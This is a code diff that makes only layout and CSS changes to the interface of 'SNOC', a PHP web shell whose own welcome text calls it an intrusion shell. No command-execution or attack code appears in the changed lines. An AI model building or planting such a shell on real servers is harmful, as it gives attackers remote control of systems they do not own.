@@ -146,10 +146,10 @@ function echoJS()
 
 		$("#command").focus();					// Focus the command line with cursor
 		$("#dir").empty().append(current_dir);			// Display current direcory
-		for(var i=0;i<21;i++)					// Look and feel (includes 21 <br>s)
+		for(var i=0;i<2;i++)					// Look and feel (includes 21 <br>s)
 			$("#out").append("<br/>");
 		
-		printShell('<pre style="margin-left: 170px"> #####  #     # #######  #####<br />'+  
+		printShell('<pre style="margin-left: 50px"> #####  #     # #######  #####<br />'+  
 '#     # ##    # #     # #     #<br />'+
 '#       # #   # #     # #      <br />'+ 
 ' #####  #  #  # #     # #       <br />'+
@@ -158,7 +158,7 @@ function echoJS()
 ' #####  #     # #######  #####  <br />'+                                
 '</pre><br />');
 
-		printShell('<span style="margin-left:185px">Shell is Not an Oil Company</span><br /><br />');
+		printShell('<span style="margin-left:50px">Shell is Not an Oil Company</span><br /><br />');
 	
 		printShell("<p>Welcome to the SNOC shell. For more info on what you can do with SNOC, type 'help' on the prompt.</p>"+
 		"<p><b>DISCLAIMER:</b> Although SNOC has been designed as an intrusion shell, please notice that we refuse to be held "+ 
@@ -467,6 +467,11 @@ function echoJS()
 	// if everything is loaded run :
 	$(function(){
 		var sh = new Shell();
+
+		$('#out').css('height', $(window).height()-40);
+		$(window).resize(function() {
+			$('#out').css('height', $(window).height()-40);
+		});
 	});
 	
 <?php echo '// ]]></script>';
@@ -501,46 +506,51 @@ function echoHead()
 
 	#shell{ 
 	background-color:#000;
-	width:600px;
+	width:100%;
 	margin:0 auto;
-	height:400px;
-	margin-top:20px;
-	position:relative;
-
+	height:100%;
+	margin-top:0px;
 	color:#FFF;
 	text-align:left;
 	}
 
 
 	#command{
+	position: absolute;
 	width:600px;
 	border:none;
 	background-color: #222;
 	padding:0px;
 	margin:0px;
-	position:absolute;
 	padding:3px 0px;
 	color:#FFF;
-	top:370px;
-	left:0px;
+	/*top:370px;*/
+	left:1px;
+	bottom:1px;
 	}
 
-	#out{   
-	height:340px;
-	overflow:auto;
+	#out{
+	height:400px;
+	padding: 5px;
+	padding-bottom:40px;
+	padding-top:0px;
+	width:99%;
+	overflow-y: scroll;
+	overflow-x: hidden;
 	}
 
-	#dir{   
+	#dir{ 
+	background-color:#000;  
 	position:absolute;
-	top:350px;
+	bottom: 23px;
 	left:0px;
 	color:#AB1A2D;
 	}
 
 	#action{   
 	position:absolute;
-	top:347px;
-	left:410px;
+	bottom: 2px;
+	right: 20px;
 	color:#FFF;
 	}
 	</style>
